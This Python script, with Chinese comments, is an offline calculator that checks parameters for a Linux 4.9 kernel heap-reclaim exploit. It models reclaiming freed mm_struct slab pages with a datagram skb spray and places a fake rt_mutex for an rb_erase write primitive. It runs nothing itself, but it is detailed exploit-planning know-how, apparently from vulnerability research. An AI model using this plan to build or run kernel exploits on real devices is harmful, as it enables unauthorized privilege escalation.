#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""reclaim_model.py — G5 离线可行性：K3 4.9 的 ② 同页回收模型计算器 / 断言表。

只读、离线。不连接设备、不执行任何内核操作。
输入全部是 4.9 厂商源码常量（见 GHOSTLOCK_HEAP_RECLAIM_FEASIBILITY.md §3 的 file:line）。
输出：几何/顺序/偏移断言，以及"释放 mm slab 页 → 同阶 skb 复占"的序列参数。

用法: python tools/reclaim_model.py
"""
import sys

PAGE = 4096
# ---- 4.9 厂商常量（源码依据）----
MM_ORDER = 2                 # slabinfo: mm_struct 18 obj / 4 pages
MM_SZ = 896                  # slabinfo
MM_OBJS_PER_SLAB = 18        # slabinfo
MIN_PARTIAL = 5              # mm/slub.c:173 MIN_PARTIAL，mm_cachep ilog2(896)/2=4 → 钳到 5
CPU_PARTIAL_OBJS = 13        # mm/slub.c:3796-3805（size 896 ∈ [256,1024)）
SHINFO_ALIGN = 320           # SKB_DATA_ALIGN(sizeof(struct skb_shared_info))
SKB_PAYLOAD = 16064          # 恰为 SKB_MAX_ALLOC（见下）

# ---- 结构偏移（G4 / 厂商源码）----
LOCK_OFF = 0x40              # 页内 fake rt_mutex 偏移（自选，避开 V+0 覆盖）
LOCK_WAIT_LOCK = 0x00        # rt_mutex.wait_lock (u32)
LOCK_RB_ROOT = 0x08          # waiters.rb_node
LOCK_LEFTMOST = 0x10         # waiters_leftmost
LOCK_OWNER = 0x18            # owner（本模型置 0）
DECOY_OFF = 0x200            # 页内 decoy waiter（撑起 :702 的 top_waiter）
W_TREE = 0x00                # waiter.tree_entry / parent_color
W_PI_TREE = 0x18
W_TASK = 0x30
W_LOCK = 0x38
W_PRIO = 0x40
W_DEADLINE = 0x48
W_SIZE = 0x50                # 厂商 waiter 0x50（G4 §70.3）

# ---- 写原语（G4 §4 / §E3 的 4.9 变体）----
# fake->parent_color = Q；fake->rb_left = 0；fake->rb_right = V
# rb_erase(fake): __rb_change_child(fake, V, Q, root) → Q->rb_right = V
# 即 target = Q + 0x10；并 rb_set_parent_color(V, Q) → *(u64*)V = Q|1
# V=0 → 8 字节零写；V=可写内核地址 → 写入 V，且 V+0 被覆盖。


def align_up(x, a):
    return (x + a - 1) & ~(a - 1)


def order_of(size):
    o, p = 0, PAGE
    while p < size:
        p <<= 1
        o += 1
    return o


def main():
    fails, passes = [], []

    def chk(ok, label, detail=""):
        (passes if ok else fails).append((label, detail))

    # 1. skb dgram 尺寸链
    skb_max_alloc = (PAGE << 2) - SHINFO_ALIGN          # SKB_MAX_ALLOC
    data_len = max(0, SKB_PAYLOAD - skb_max_alloc)      # unix_dgram: len > SKB_MAX_ALLOC 才用 frags
    linear = SKB_PAYLOAD - data_len
    alloc = align_up(linear, 64) + SHINFO_ALIGN
    skb_order = order_of(alloc)
    chk(skb_max_alloc == 16064, "SKB_MAX_ALLOC == 16064", f"{skb_max_alloc}")
    chk(data_len == 0 and linear == SKB_PAYLOAD, "16064 走单块 linear（无 frags）", f"data_len={data_len}")
    chk(alloc == 16384, "skb data 分配 16384", f"{alloc}")
    chk(skb_order == MM_ORDER == 2, "skb data 与 mm slab 同为 order-2", f"skb={skb_order} mm={MM_ORDER}")

    # 2. mm slab 几何
    slab_bytes = PAGE << MM_ORDER
    chk(slab_bytes == 16384, "mm slab = 16 KB", f"{slab_bytes}")
    chk(MM_SZ * MM_OBJS_PER_SLAB <= slab_bytes, "18 × 896 装入 16 KB", f"{MM_SZ*MM_OBJS_PER_SLAB}")
    chk(MM_SZ * MM_OBJS_PER_SLAB + MM_SZ > slab_bytes, "18 是每页最大对象数", "")

    # 3. 页内偏移必须全部落在用户 payload 内（shinfo 在 16064..16384）
    offs = [LOCK_OFF, DECOY_OFF, DECOY_OFF + W_SIZE]
    chk(max(offs) < SKB_PAYLOAD, "fake 结构偏移 < 16064（不碰 shared_info）", f"max={max(offs):#x}")
    chk(LOCK_OFF + 0x20 <= SKB_PAYLOAD and DECOY_OFF + W_SIZE <= SKB_PAYLOAD,
        "fake lock 0x20 / decoy waiter 0x50 完整落在 payload 内", "")

    # 4. 写原语代数
    # 目标 target = Q + 0x10；Q 可取 target - 0x10（target 8 字节对齐 ⇒ Q 8 字节对齐、低 bit 0 ⇒ fake 视为红）
    chk(0x10 % 8 == 0, "Q = target - 0x10 对 8 字节对齐 target 仍对齐", "")
    chk((0x10 & 1) == 0, "Q 低 bit 0 ⇒ fake 视为红（rebalance 跳过）", "")
    chk(LOCK_OFF != 0, "V+0 覆盖不落在 fake lock 上（LOCK_OFF>0）", "")

    # 5. 回收序列参数（推荐：先 seed 每 slab 一个对象，再 mass free）
    seed_slabs = 32
    children = seed_slabs * MM_OBJS_PER_SLAB
    freed_pages = seed_slabs                      # 32 × 16 KB
    spray_pages = 3072                            # v4 P1 实测：256 socket × 12
    chk(freed_pages < spray_pages, "喷射页数 > 待回收页数", f"{freed_pages} < {spray_pages}")
    chk(seed_slabs > MIN_PARTIAL, "seed 数 ≥ min_partial+（保证空 slab 被丢弃）", f"{seed_slabs}")
    chk(seed_slabs > CPU_PARTIAL_OBJS, "seed 数 > cpu_partial(13)（保证 cpu partial 排空）", f"{seed_slabs}")

    print("== 几何 ==")
    print(f"  mm_cachep: {MM_SZ} B × {MM_OBJS_PER_SLAB}/slab, order {MM_ORDER} ({slab_bytes} B), "
          f"min_partial={MIN_PARTIAL}, cpu_partial={CPU_PARTIAL_OBJS} objects")
    print(f"  skb(dgram {SKB_PAYLOAD}): linear={linear}, alloc={alloc}, order={skb_order}, "
          f"payload 自页基址 +0 起")
    print(f"  fake lock @ 页 +{LOCK_OFF:#x}; decoy waiter @ 页 +{DECOY_OFF:#x}")
    print(f"  写: *(u64*)(Q+0x10) = V ; *(u64*)V = (Q|1)   （V=0 时退化为 8 字节零写）")
    print(f"  序列: fork {children} children → seed {seed_slabs} 个 slab（每 slab 杀 1）"
          f" → mass free → 立即 dgram 喷射 {spray_pages} 页")

    print("\n== 判定 ==")
    for label, detail in passes:
        print(f"  [PASS] {label}" + (f" ({detail})" if detail else ""))
    for label, detail in fails:
        print(f"  [FAIL] {label}" + (f" ({detail})" if detail else ""))
    return 0 if not fails else 1


if __name__ == "__main__":
    sys.exit(main())
